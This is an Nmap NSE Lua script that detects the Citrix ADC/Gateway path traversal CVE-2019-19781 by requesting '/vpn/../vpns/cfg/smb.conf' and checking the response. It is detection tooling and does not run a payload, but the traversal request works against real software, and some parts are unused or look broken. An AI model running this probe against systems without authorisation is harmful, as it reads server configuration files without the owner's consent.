local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"
local catch = function()
		client_ident:close()
		client_service:close()
	end

description = [[
Assesses a citrix server endpoint for CVE-2019-19781 vulnerability
An issue was discovered in Citrix Application Delivery Controller (ADC) 
and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.

Original exploit and discovery by the great Dave (ReL1K) Kennedy and Rob Simon.
Ref: https://github.com/trustedsec/cve-2019-19781
See: https://nvd.nist.gov/vuln/detail/CVE-2019-19781 for more information.  
]]


-- @changelog
-- 2020-01-11 - created by Brent 'becrevex' Chambers - cygienesolutions.com
--

author = "Brent 'becrevex' Chambers"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "exploit", "auth"}

portrule = shortport.port_or_service (443, "https", "tcp")

local result = {}
local path = {"/vpn/../vpns/cfg/smb.conf"}

action = function(host, port)

	local command = stdnse.get_script_args(SCRIPT_NAME .. ".command")
	local invasive = stdnse.get_script_args(SCRIPT_NAME .. ".invasive")

	local vuln_table = {
	title = "CVE-2019-19781 - Citrix ADC and Citrix Gateway Path Traversal",
	state = vulns.STATE.NOT_VULN,
	risk_factor = "High",
	references = {
	  'https://support.citrix.com/article/CTX267027',
	  'https://www.kb.cert.org/vuls/id/619785',
	},
	IDS = {
	  CVE = ' 2019-19781',
	  CWE = ' CWE-22'
	},
	scores = {
	  CVSS2 =  '8.5'
	},
		description = [[
		A vulnerability  has been identified in Citrix Application Delivery 
		Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known 
		as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker 
		to perform arbitrary code execution.]]
	}
	
	local report = vulns.Report:new(SCRIPT_NAME, host, port)


	stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
	local data = http.get(host, port, "/vpn/../vpns/cfg/smb.conf")

	if data and data.status then
		if string.match(data.body, "global") then
			stdnse.debug1("Shitrix Vulnerability Confirmed.")
			vuln_table.state = vulns.STATE.LIKELY_VULN
			table.insert(result, "\n[!] Vulnerable to Citrix CVE-2019-19781 directory traversal vulnerability:\nhttp://seclists.org/fulldisclosure/2010/Oct/119")
		else
			stdnse.debug1("Endpoint does not appear to be vulnerable")
			table.insert(result, "\n[!] Not vulnerable CVE-2019-19781 (Shitrix)")
		end
	end
	stdnse.format_output(true, result)	
	return report:make_output(vuln_table)
end
